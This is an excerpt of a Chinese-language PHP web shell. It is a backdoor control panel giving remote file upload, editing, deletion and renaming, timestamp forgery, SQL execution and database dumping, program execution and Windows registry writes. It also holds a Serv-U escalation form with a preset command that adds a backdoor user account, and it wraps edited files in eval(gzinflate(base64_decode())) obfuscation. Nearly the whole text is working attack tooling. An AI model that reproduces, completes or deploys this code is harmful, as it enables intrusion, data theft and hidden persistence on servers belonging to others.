...
elseif (!empty($deldir)) {
	$deldirs="$dir/$deldir";
	if (!file_exists("$deldirs")) $tb->tdbody("$deldir 目录已不存在!");
	else  $tb->tdbody((deltree($deldirs)) ? "目录删除成功!" : "目录删除失败!");
}

// 创建目录
elseif (($_GET['action']=="dir") and ($_GET['do']=="createdirectory") AND !empty($_GET['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) $tb->tdbody("该目录已存在!");
		else {
			$tb->tdbody((@mkdir("$mkdirs",0777)) ? "创建目录成功!" : "创建失败!");
			@chmod("$mkdirs",0777);
		}
	}
}
...
// 上传文件
elseif ($doupfile) {
	$tb->tdbody((@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "文件上传成功!" : "文件上传失败!");
}
// 编辑文件
elseif ($_POST['do'] == 'doeditfile') {
  ...
  if(!file_exists($editfilename)) unset($retime);
    ...
    $filecontent = "<?php\n/*\n代码由浅蓝的辐射鱼加密!\n*/\neval(gzinflate(base64_decode('$filecontent')));\n"."?>";
		...
		$tb->tdbody($msg=@fwrite($fp,$filecontent) ? "写入文件成功!" : "写入失败!");
		@fclose($fp);
		if($retime=="yes"){
				$tb->tdbody($msg=@touch($filename,$time) ? "修改文件为".$time2."成功!" : "修改文件时间失败!");
		}
	} else {
		$tb->tdbody("请输入想要编辑的文件名!");
	}
}
//文件下载
elseif ($_POST['do'] == 'downloads') {
	...
	if(!$contents){
		$tb->tdbody("无法读取要下载的数据");
	}
	elseif(file_exists($path)){
		$tb->tdbody("很抱歉，文件".$path."已经存在了，请更换保存文件名。");
	}else{
  $fp = @fopen($path,"w");
		$tb->tdbody($msg=@fwrite($fp,$contents) ? "下载文件成功!" : "下载文件写入时失败!");
	@fclose($fp);
	}
}
...
elseif ($_POST['do'] == 'editfileperm') {
	if (!empty($_POST['fileperm'])) {
		...
		$tb->tdbody((@chmod($dir."/".$file,$fileperm)) ? "属性修改成功!" : "修改失败!");
		$tb->tdbody(" 文件 ".$file." 修改后的属性为: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4));
	} else {
		$tb->tdbody("请输入想要设置的属性!");
	}
}
...
elseif ($_POST['do'] == 'rename') {
	if (!empty($_POST['newname'])) {
		...
		if (@file_exists($newname)) {
			$tb->tdbody("".$_POST['newname']." 已经存在,请重新输入一个!");
		} else {
			$tb->tdbody((@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." 成功改名为 ".$_POST['newname']." !" : "文件名修改失败!");
		}
	} else {
		$tb->tdbody("请输入想要改的文件名!");
	}
}
elseif ($_POST['do'] == 'search') {
if(!empty($oldkey)){
	$tb->tdbody("<span class=\"redfont\">查找关键词:[".$oldkey."],下面显示查找的结果:");
	if($type2 == "getpath"){
	$tb->tdbody("鼠标移到结果文件上会有部分截取显示.");
}
$tb->tdbody("</span><br><hr width=\"775\" noshade>");
find($path);
}else{
$tb->tdbody("你要查虾米?到底要查虾米呢?有没有虾米要你查呢?");
}
}
...
elseif ($_POST['do'] == 'domodtime') {
	if (!@file_exists($_POST['curfile'])) {
		...
		if (!@file_exists($_POST['tarfile'])) {
			...
			$tb->tdbody((@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." 的修改时间成功改为 ".date("Y-m-d H:i:s",$time)." !" : "文件的修改时间修改失败!");
		}
	}
}
...
elseif ($_POST['do'] == 'query') {
	...
	$tb->tdbody(($result) ? "SQL语句成功执行!" : "出错: ".mysql_error());
	mysql_close();
}
...
elseif ($_POST['do'] == 'backupmysql') {
	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
		...
		if ($_POST['backuptype'] == 'server') {
			...
			if ($filehandle) {
				$result = mysql_query("SHOW tables");
				$tb->tdbody(($result) ? NULL : "出错: ".mysql_error());
				while ($currow = mysql_fetch_array($result)) {
					if (isset($table[$currow[0]])) {
				...
				fclose($filehandle);
				$tb->tdbody("数据库已成功备份到 <a href=\"".$path."\" target=\"_blank\">".$path."</a>");
				mysql_close();
			} else {
				$tb->tdbody("备份失败,请确认目标文件夹是否具有可写权限!");
			}
		}
	}
}
...
elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
	...
	$tb->tdbody(($a=='0') ? "程序已经成功执行!" : "程序运行失败!");
}

// 查看PHP配置参数状况
elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
	$tb->tdbody("配置参数 ".$_POST['phpvarname']." 检测结果: ".getphpcfg($_POST['phpvarname'])."");
}
...
elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
	...
	$tb->tdbody(($a=='0') ? "写入注册表健值成功!" : "写入 ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." 失败!");
}
...
elseif(($regdelete) AND !empty($_POST['delregname'])) {
	...
	$tb->tdbody(($a=='0') ? "删除注册表健值成功!" : "删除 ".$_POST['delregname']." 失败!");
}
...
$tb->tableheader();
$tb->tdbody('<div style="float:left;padding-left:15px;">程序路径: '.$pathname.'</div><div style="float:right;padding-right:15px;">当前目录('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath);
$tb->tdbody('<form action="?dir='.urlencode($dir).'" method="POST" enctype="multipart/form-data"><input name="uploadfile" value="" type="file" size="30">&nbsp;&nbsp;<input name="doupfile" value="上传文件" type="submit"><input name="uploaddir" value="'.$dir.'" type="hidden"></form>');
$tb->tdbody('<input name="myinput" value="" type="text" size="30">&nbsp;&nbsp;<input name="Input" value="跳转目录" type="button" title="跳转到指定目录，支持绝对路径和相对路径" onclick=window.location.href="?dir="+myinput.value>&nbsp;&nbsp;<input name="Input2" value="新建目录" type="button" title="在当前目录下新建指定目录" onclick=window.location.href="?action=dir&do=createdirectory&newdirectory="+myinput.value>&nbsp;&nbsp;<input name="Input3" value="新建文件" type="button" title="在当前目录下新建指定文件" onclick=window.location.href="?action=editfile&dir='.urlencode($dir).'&newfile="+myinput.value>');
$tb->tablefooter();
...
while ($file=@readdir($dirs)) {
	...
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			...
			echo "  <td align=\"left\" nowrap>[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
...
@closedir($dirs); 
$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="left"><tr><td align=left>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','选中文件打包下载','','submit').'</td><td align="right">'.$dir_i.' 个目录 / '.$file_i.' 个文件</td></tr></table>','center',getrowbg(),'','','6');
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <input name="SUPort" type="text"  id="SUPort" value="43958" size="7">  　
  LocalUser:
  <input name="SUUser" type="text"  id="SUUser" value="LocalAdministrator">   　LocalPass:
  <input name="SUPass" type="text"  id="SUPass" value="#l@$ak#.lk;0@P">
  <br>
  Command　:
  <input name="SUCommand" type="text"  id="SUCommand" value="net user Will_Be heihei /add" size="50"></td>
  </tr>
  <tr class="secondalt">
  <td align="center"><input name="Submit" type="submit"  id="Submit" value="执行">　
...
$tb->tableheader();
$tb->tdbody('<span style="DISPLAY: block; FILTER: glow(color=#FFFFFF,strength=5); COLOR: blue; HEIGHT: 1px; TEXT-ALIGN: center;border: 1px solid #66ccff;">地址:湖南娄底明珠电脑城南二栋105号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=http://amypc.cn>泽丰电脑</a>&nbsp;&nbsp;&copy;&nbsp;&nbsp;版权所有&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;联系:0738-8922025 6488082</span>');
$tb->tablefooter();
?>
</center>
</body>
...
<?php
	...
	class FORMS {
		function tableheader() {
			echo "<table style=\"width:775px;border: #3A6EA5 1px solid;\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
		}
